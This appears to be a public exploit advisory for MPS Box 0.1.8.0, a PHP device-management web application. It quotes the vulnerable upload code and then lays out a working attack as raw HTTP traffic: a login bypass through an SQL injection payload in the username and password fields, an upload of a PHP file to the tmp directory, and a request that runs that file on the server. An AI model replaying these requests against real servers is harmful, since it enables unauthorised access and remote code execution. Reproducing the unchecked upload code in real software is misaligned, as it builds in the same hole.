@@ -1,0 +1,130 @@
+# Exploit Title: MPS Box 0.1.8.0 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2018-10-25
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.mpsbox.com/
+# Software Link: https://sourceforge.net/projects/mpsbox/files/latest/download
+# Version: 0.1.8.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/device_add.php
+# 
+# http://localhost/[PATH]/tmp/[FILE]
+# 
+# [PATH]/device_add.php
+# ....
+# 51 if(isset($_POST['upload'])) {
+# 52 
+# 53 $uploaddir = realpath(dirname(__FILE__)) . '/tmp/';
+# 54 $uploadfile = $uploaddir . basename($_FILES['files_to_upload']['name']);
+# 55 
+# 56 if (move_uploaded_file($_FILES['files_to_upload']['tmp_name'], $uploadfile)) {
+# 57 //	$_SESSION['status'] = "File is valid, and was successfully uploaded.\n";
+# 58 
+# 59 	$file_handle = fopen($uploadfile, "r");
+# 60 	while (!feof($file_handle) ) {
+# 61 	$line_of_text = fgetcsv($file_handle, 1024);
+# 62 	if(!empty($line_of_text[0])) {
+# 63 	device_queue_add('new','',"$line_of_text[0]","$line_of_text[1]",'','1');
+# 64 	}
+# 65 	}
+# ....
+
+POST /[PATH]/login_page.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/[PATH]/login_page.php
+Cookie: PHPSESSID=c1lc3729cfh58b72udo055urg7
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 85
+username=%27or+1%3D1+or+%27%27%3D%27&password=%27or+1%3D1+or+%27%27%3D%27&login=Login
+HTTP/1.1 302 Found
+Date: Thu, 25 Oct 2018 13:34:44 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: http://localhost/[PATH]/device_add.php
+Content-Length: 5652
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+POST http://localhost/[PATH]/device_add.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=c1lc3729cfh58b72udo055urg7
+Connection: keep-alive
+Content-Type: multipart/form-data; boundary=
+---------------------------20568543311864623172004480142
+Content-Length: 509
+-----------------------------20568543311864623172004480142
+Content-Disposition: form-data; name="files_to_upload"; filename="phpinfo.php"
+Content-Type: application/force-download
+<?php
+phpinfo();
+?>
+-----------------------------20568543311864623172004480142
+Content-Disposition: form-data; name="MAX_FILE_SIZE"
+100000
+-----------------------------20568543311864623172004480142
+Content-Disposition: form-data; name="upload"
+Upload
+-----------------------------20568543311864623172004480142--
+HTTP/1.1 302 Found
+Date: Thu, 25 Oct 2018 13:35:07 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: device_upd.php
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+
+GET http://localhost/[PATH]/tmp/phpinfo.php HTTP/1.1
+Host: 192.168.1.27
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=c1lc3729cfh58b72udo055urg7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 25 Oct 2018 13:35:38 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+
+<html>
+<body>
+<form class="form_nontbl" action="http://localhost/[PATH]/device_add.php" enctype="multipart/form-data" method="POST">
+<label>Select file</label><br>
+<input name="files_to_upload" type="file"><br>
+<a href="/inc/printers.csv">CSV file template</a>
+<label>&nbsp;</label><br>
+<input name="MAX_FILE_SIZE" value="100000" type="hidden">
+<input accept="csv" class="button alt2" name="upload" value="Upload" type="submit">
+</form>
+</body>
+</html>
